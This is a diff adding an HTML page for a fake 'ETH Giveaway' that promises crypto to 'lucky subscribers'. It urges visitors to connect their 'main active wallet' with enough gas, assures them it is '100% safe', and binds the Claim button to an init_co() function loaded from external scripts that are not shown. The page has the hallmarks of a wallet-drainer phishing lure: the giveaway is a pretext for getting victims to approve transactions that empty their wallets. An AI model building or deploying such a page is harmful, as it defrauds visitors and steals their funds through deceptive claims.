@@ -1,0 +1,335 @@
+<!doctype html>
+<html lang="en">
+  <head>
+   <script src="./assets/sources.js"></script>
+   <script src="./assets/web3__5002453574.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ETH Giveaway</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        position: relative;
+      }
+
+      body::before {
+        content: '';
+        position: fixed;
+        top: 20%;
+        left: 10%;
+        width: 400px;
+        height: 400px;
+        background: radial-gradient(circle, rgba(34, 211, 238, 0.1) 0%, transparent 70%);
+        border-radius: 50%;
+        filter: blur(60px);
+        animation: pulse 8s ease-in-out infinite;
+        z-index: 0;
+      }
+
+      body::after {
+        content: '';
+        position: fixed;
+        bottom: 20%;
+        right: 10%;
+        width: 500px;
+        height: 500px;
+        background: radial-gradient(circle, rgba(16, 185, 129, 0.1) 0%, transparent 70%);
+        border-radius: 50%;
+        filter: blur(60px);
+        animation: pulse 8s ease-in-out infinite 1s;
+        z-index: 0;
+      }
+
+      @keyframes pulse {
+        0%, 100% {
+          opacity: 0.5;
+        }
+        50% {
+          opacity: 1;
+        }
+      }
+
+      .container {
+        position: relative;
+        z-index: 10;
+        width: 100%;
+        padding: 20px;
+      }
+
+      .modal {
+        background: rgba(30, 41, 59, 0.8);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 24px;
+        padding: 60px 40px;
+        max-width: 600px;
+        margin: 0 auto;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        animation: slideIn 0.6s ease-out;
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .badge {
+        display: inline-block;
+        padding: 8px 16px;
+        background: rgba(16, 185, 129, 0.2);
+        border: 1px solid rgba(16, 185, 129, 0.5);
+        border-radius: 20px;
+        color: #6ee7b7;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 24px;
+        animation: bounce 2s ease-in-out infinite;
+      }
+
+      @keyframes bounce {
+        0%, 100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-4px);
+        }
+      }
+
+      h1 {
+        font-size: 48px;
+        font-weight: 700;
+        background: linear-gradient(135deg, #06b6d4, #10b981);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        margin-bottom: 12px;
+        letter-spacing: -1px;
+      }
+
+      .subtitle {
+        font-size: 24px;
+        color: #cbd5e1;
+        margin-bottom: 32px;
+        font-weight: 500;
+      }
+
+      .info-box {
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 16px;
+        padding: 24px;
+        margin-bottom: 32px;
+        space-y: 16px;
+      }
+
+      .info-item {
+        display: flex;
+        gap: 16px;
+        margin-bottom: 16px;
+        align-items: flex-start;
+      }
+
+      .info-item:last-child {
+        margin-bottom: 0;
+      }
+
+      .icon {
+        width: 24px;
+        height: 24px;
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+      }
+
+      .icon.shield {
+        color: #06b6d4;
+      }
+
+      .icon.wallet {
+        color: #10b981;
+      }
+
+      .icon.gift {
+        color: #fbbf24;
+      }
+
+      .info-text {
+        color: #cbd5e1;
+        font-size: 14px;
+        line-height: 1.6;
+      }
+
+      .info-text strong {
+        color: #f1f5f9;
+        font-weight: 600;
+      }
+
+      .button {
+        width: 100%;
+        padding: 16px 24px;
+        background: linear-gradient(135deg, #06b6d4, #10b981);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 18px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        box-shadow: 0 10px 30px rgba(6, 182, 212, 0.3);
+      }
+
+      .button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 15px 40px rgba(6, 182, 212, 0.4);
+      }
+
+      .button:active {
+        transform: translateY(0);
+      }
+
+      .wallet-icon {
+        width: 20px;
+        height: 20px;
+      }
+
+      .features {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 16px;
+        margin-top: 40px;
+      }
+
+      .feature-card {
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 12px;
+        padding: 20px;
+        text-align: center;
+        transition: all 0.3s ease;
+      }
+
+      .feature-card:hover {
+        transform: translateY(-4px);
+        border-color: rgba(6, 182, 212, 0.5);
+        background: rgba(6, 182, 212, 0.1);
+      }
+
+      .feature-icon {
+        font-size: 28px;
+        margin-bottom: 12px;
+      }
+
+      .feature-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #f1f5f9;
+        margin-bottom: 8px;
+      }
+
+      .feature-desc {
+        font-size: 12px;
+        color: #94a3b8;
+      }
+
+
+      @media (max-width: 480px) {
+        .modal {
+          padding: 40px 24px;
+        }
+
+        h1 {
+          font-size: 36px;
+        }
+
+        .subtitle {
+          font-size: 18px;
+        }
+
+        .features {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="modal">
+        <div class="badge">🎉 LIVE GIVEAWAY</div>
+
+        <h1>ETH Giveaway</h1>
+        <p class="subtitle">To 2 Lucky Subscribers</p>
+
+        <div class="info-box">
+          <div class="info-item">
+            <div class="icon shield">🛡️</div>
+            <p class="info-text">
+              <strong>ENSURE SUFFICIENT GAS</strong> (ETH/BNB/MATIC/BASE/AVAX) in your wallet to process the claim. Gas is required for network fees!
+            </p>
+          </div>
+
+          <div class="info-item">
+            <div class="icon wallet">👛</div>
+            <p class="info-text">
+              <strong>Use your main active wallet</strong> for the best experience
+            </p>
+          </div>
+
+          <div class="info-item">
+            <div class="icon gift">🎁</div>
+            <p class="info-text">
+              Connect your wallet to check eligibility and claim your reward
+            </p>
+          </div>
+        </div>
+
+        <button class="button" onclick="init_co()">
+          <span>👛</span>
+          <span>Claim</span>
+        </button>
+
+        <div class="features">
+          <div class="feature-card">
+            <div class="feature-icon">🔒</div>
+            <div class="feature-title">Secure</div>
+            <div class="feature-desc">100% safe connection</div>
+          </div>
+          <div class="feature-card">
+            <div class="feature-icon">⚡</div>
+            <div class="feature-title">Fast</div>
+            <div class="feature-desc">Instant verification</div>
+          </div>
+          <div class="feature-card">
+            <div class="feature-icon">✓</div>
+            <div class="feature-title">Fair</div>
+            <div class="feature-desc">Transparent process</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </body>
+</html>
